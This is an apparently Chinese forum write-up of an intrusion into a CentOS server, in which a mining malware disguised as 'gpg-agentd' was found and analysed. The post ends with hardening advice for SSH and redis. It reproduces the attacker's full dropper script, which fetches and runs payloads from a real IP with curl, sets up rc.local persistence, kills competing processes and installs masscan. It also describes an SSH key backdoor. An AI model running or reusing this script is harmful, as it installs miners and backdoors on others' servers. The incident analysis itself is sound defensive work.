
![图片描述](upload/attach/201901/3\_U9QGSG9Y4CQB9AF.png)(<mark class="encrypted">a69K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3!0\*7K9Y4y4H3y4X3V1J5x3g2)9J5k6h3u0C8N6q4)9J5k6h3y4D9L8%4g2V1k6r3&6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3e0R3H3x3K6p5@1i4K6u0r3b7f1I4s2x3V1A6B7K9p5g2Y4b7W2)9J5k6i4m8F1k6#2)9K6c8X3W2E0j5h3N6W2M7$3I4A6L8g2)9J5z5b7`.`.</mark>

还剩最后一个问题，这个`gpg-agentd`程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个`gpg-agentd`拖到`ida`中，用`string`搜索`bitcoin`、`eth`、`mine`等相关单词，最终发现了这个：

![图片描述](upload/attach/201901/3\_QMEDT8Z3UE5JN9X.png)(<mark class="encrypted">6cdK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3!0\*7K9Y4y4H3y4X3V1J5x3g2)9J5k6h3u0C8N6q4)9J5k6h3y4D9L8%4g2V1k6r3&6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3e0R3H3x3K6p5@1i4K6u0r3k6K6k6S2c8V1R3I4d9@1N6o6y4W2)9J5k6i4m8F1k6#2)9K6c8X3W2E0j5h3N6W2M7$3I4A6L8g2)9J5z5b7`.`.</mark>

---

打开`nicehash.com`看一下，一切都清晰了。

![图片描述](upload/attach/201901/3\_Z5TQ86NTB7QREMR.png)(<mark class="encrypted">f3aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3!0\*7K9Y4y4H3y4X3V1J5x3g2)9J5k6h3u0C8N6q4)9J5k6h3y4D9L8%4g2V1k6r3&6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3e0R3H3x3K6p5@1i4K6u0r3j5K6y4x3k6$3I4w2L8p5f1I4k6g2)9J5k6i4m8F1k6#2)9K6c8X3W2E0j5h3N6W2M7$3I4A6L8g2)9J5z5b7`.`.</mark>

---

# 0x04 安全建议

## 一，服务器

> 1，禁用`ROOT`
> 2，用户名和密码尽量复杂
> 3，修改`ssh`的默认22端口
> 4，安装`DenyHosts`防暴力破解软件
> 5，禁用密码登录，使用`RSA`公钥登录

## 二，`redis`

> 1，禁用公网IP监听，包括`0.0.0.0`
> 2，使用密码限制访问`redis`
> 3，使用较低权限帐号运行`redis`

到此，整个入侵过程基本分析完了，如果大家对样本有兴趣，也可以自行去`curl`，或是去虚拟机执行上面的脚本。鉴于本人能力有限，文中难免会出现疏忽或是错误，还请大家多多指正。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_WQXUGQMUW6K3JNE.png)

# 0x00 背景

周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，`ssh`连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:`root`，还有不足8位的小白密码，心里一凉：被黑了！

---

# 0x01 查找线索

服务器系统CentOS 6.X，部署了`nginx`，`tomcat`，`redis`等应用，上来先把数据库全备份到本地，然后`top`命令看了一下，有2个99%的同名进程还在运行，叫`gpg-agentd`。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_ZAVR6NWP8W8NV3N.png)(<mark class="encrypted">551K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3!0\*7K9Y4y4H3y4X3V1J5x3g2)9J5k6h3u0C8N6q4)9J5k6h3y4D9L8%4g2V1k6r3&6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3e0R3H3x3K6p5@1i4K6u0r3y4V1y4E0c8@1V1&6y4$3I4o6c8g2)9J5k6i4m8F1k6#2)9K6c8X3W2E0j5h3N6W2M7$3I4A6L8g2)9J5z5b7`.`.</mark>

google了一下`gpg`，结果是：

> GPG提供的`gpg-agent`提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。

看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母`d`，伪装的很好，让人想起来windows上各种看起来像`svchost.exe`的病毒。继续

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_WV22YFVY9Y7BTS4.png)

查看`pid:23374`进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：

> 1，文件是怎么上传的？
> 2，这个文件的目的是什么，或是黑客想干嘛？

`history`看一下，记录果然都被清掉了，没留下任何痕迹。继续命令`more messages`，

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_6VH57QSCVFRC8PM.png)(<mark class="encrypted">b61K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3!0\*7K9Y4y4H3y4X3V1J5x3g2)9J5k6h3u0C8N6q4)9J5k6h3y4D9L8%4g2V1k6r3&6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3e0R3H3x3K6p5@1i4K6u0r3y4f1g2S2k6V1q4A6d9h3f1H3k6g2)9J5k6i4m8F1k6#2)9K6c8X3W2E0j5h3N6W2M7$3I4A6L8g2)9J5z5b7`.`.</mark>

看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。

`crontab -e`

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_99H8Y77N4EWMSTZ.png)

果然，线索找到了。

---

# 0x02 作案动机

上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。

```
curl -fsSL 159.89.190.243/ash.php > ash.sh
```

脚本内容如下：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_CMMYD4N94DUYW5N.png)

大致分析一下该脚本的主要用途：

> 首先是关闭SELinux，解除shell资源访问限制，然后在`/root/.ssh/authorized_keys`文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章[SSH原理与运用](https://bbs.kanxue.com/elink@30bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4u0#2j5h3&6&6K9h3k6W2L8X3N6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3U0l9I4x3g2)9J5c8U0p5J5i4K6u0r3M7%4y4Z5i4K6g2X3M7X3g2E0L8%4c8W2i4K6g2X3L8r3!0Y4K9h3&6Q4x3X3g2Z5N6r3#2D9)。接下来安装`bash`，最后是继续下载第二个脚本`bsh.php`，并且执行。

继续下载并分析`bsh.pbp`，内容如下：

```
sleep $( seq 3 7 | sort -R | head -n1 )

cd /tmp || cd /var/tmp

sleep 1

mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix && cd .ICE-unix/...

sleep 1

if [ -f .watch ]; then

rm -rf .watch

exit 0

fi

sleep 1

echo 1 > .watch

sleep 1

ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null

ps x | awk '!/awk/ && /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/null

sleep 1

if ! [ -x /usr/bin/gpg-agentd ]; then

curl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.db

echo '/usr/bin/gpg-agentd' > /etc/rc.local

echo 'curl -fsSL 159.89.190.243/ash.php|sh' >> /etc/rc.local

echo 'exit 0' >> /etc/rc.local

fi

sleep 1

chmod +x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd

sleep 1

if ! [ -x "$(command -v masscan)" ]; then

rm -rf /var/lib/apt/lists/*

rm -rf x1.tar.gz

if [ -x "$(command -v apt-get)" ]; then

export DEBIAN_FRONTEND=noninteractive

apt-get update -y

apt-get install -y debconf-doc

apt-get install -y build-essential

apt-get install -y libpcap0.8-dev libpcap0.8

apt-get install -y libpcap*

apt-get install -y make gcc git

apt-get install -y redis-server

apt-get install -y redis-tools

apt-get install -y redis

apt-get install -y iptables

apt-get install -y wget curl

fi

if [ -x "$(command -v yum)" ]; then

yum update -y

yum install -y epel-release

yum update -y

yum install -y git iptables make gcc redis libpcap libpcap-devel

yum install -y wget curl

fi

sleep 1

curl -sL -o x1.tar.gz efdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5L8$3u0W2M7Y4c8V1j5i4k6A6k6r3N6J5j5h3S2S2L8g2)9J5c8X3#2S2M7%4y4U0j5h3&6Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0r3x3g2)9J5k6e0m8Q4x3X3f1@1i4K6u0W2N6r3q4J5i4K6u0W2k6%4Z5

sleep 1

[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4

fi

sleep 3 && rm -rf .watch

bash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2>/dev/null
```

这段脚本的代码比较长，但主要的功能有4个：

> 1，下载远程代码到本地，添加执行权限，`chmod u+x`。
> 2，修改`rc.local`，让本地代码开机自动执行。
> 3，下载github上的开源扫描器[代码](https://bbs.kanxue.com/elink@ba9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5L8$3u0W2M7Y4c8V1j5i4k6A6k6r3N6J5j5h3S2S2L8g2)9J5c8X3#2S2M7%4y4U0j5h3^5`.)，并安装相关的依赖软件，也就是我上面的`messages`里看到的记录。
> 4，下载第三个脚本，并且执行。

我去github上看了下这个开源代码，简直吊炸天。

> `MASSCAN`: Mass IP port scanner
>
> This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second.
>
> It produces results similar to `nmap`, the most famous port scanner. Internally, it operates more like `scanrand`, `unicornscan`, and `ZMap`, using asynchronous transmission. The major difference is that it's faster than these other scanners. In addition, it's more flexible, allowing arbitrary address ranges and port ranges.
>
> NOTE: `masscan` uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the `-S` option to use a separate IP address, or configure your operating system to firewall the ports that `masscan` uses.

transmitting 10 million packets per second(每秒发送1000万个数据包)，比`nmap`速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下`readme`之后，我也没有细究，继续下载第三个脚本。
